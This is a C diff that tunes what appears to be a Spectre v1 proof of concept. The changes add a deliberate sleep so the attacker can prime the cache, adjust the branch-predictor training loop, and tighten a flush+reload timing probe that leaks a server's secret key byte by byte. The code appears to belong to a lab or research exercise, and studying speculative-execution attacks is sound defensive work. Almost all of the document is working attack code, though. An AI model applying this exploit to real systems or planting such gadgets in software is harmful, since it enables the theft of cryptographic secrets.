@@ -19,7 +19,7 @@
 #define KEY_SIZE 8
 #define USERNAME_MAX 16
 #define PASSWORD_MAX 32
-#define CACHE_STRIDE 4096
+#define CACHE_STRIDE 4096 // change to 64 for L1 attack
 
 int attack_id = ((unsigned long)&layout.secret_key[0]-(unsigned long)&layout.role_binding.roles[0]);
 
@@ -167,8 +167,8 @@ void launch(struct Server *server)
             // gets params from POST body and assigns to local vars
             int status = get_POST_body(username, password, &user_id, buffer);
             if (status > 0){
+                usleep(500); // big pause allowing my attacker to prime
                 // trains bp for Spectre_v1
-                char *training_up = "none"; 
                 for (int k = 0; k < 200; k++) {
                     volatile uint8_t warm_up = layout.secret_key[0]; // warm secret so no long fetch needed
                     volatile uint8_t warm_roles = layout.role_binding.roles[0];
@@ -178,7 +178,7 @@ void launch(struct Server *server)
                     _mm_mfence();
 
                     // call function with valid data
-                    get_token(training_up, training_up, 0);
+                    get_token("none", "none", 0);
                 }   
                 _mm_lfence(); 
 
@@ -221,8 +221,11 @@ char * get_token(char *username, char *password, unsigned int user_id)
     if(user_id < layout.role_binding.role_count){
         temp = layout.role_usage[layout.role_binding.roles[user_id] * CACHE_STRIDE]; // * CACHE_STRIDE ensures each unqiue byte maps to unique cache set
         
-    // ======================================================
+    // ======================================================   
         temp = temp + 1;
+    }
+    
+    if(user_id < layout.role_binding.role_count){
         uint8_t role = layout.role_binding.roles[user_id];
         
         int result = check(username, password);
@@ -375,7 +378,7 @@ void spectre_flush_reload() {
 
             // RELOAD
             uint64_t t1 = __rdtscp(&junk);
-            uint8_t temp_read = *target_probe; 
+            volatile uint8_t temp_read = *target_probe; 
             uint64_t t2 = __rdtscp(&junk);
 
             // threshold of 160
@@ -386,8 +389,8 @@ void spectre_flush_reload() {
             }
         }
     
-        if (hits > 50) {
-             //printf("Success (Hits: %d / 1000)\n", hits);
+        if (hits > 800) {
+             printf("Success (Hits: %d / 1000)\n", hits);
              total_successes++;
         }
     }   
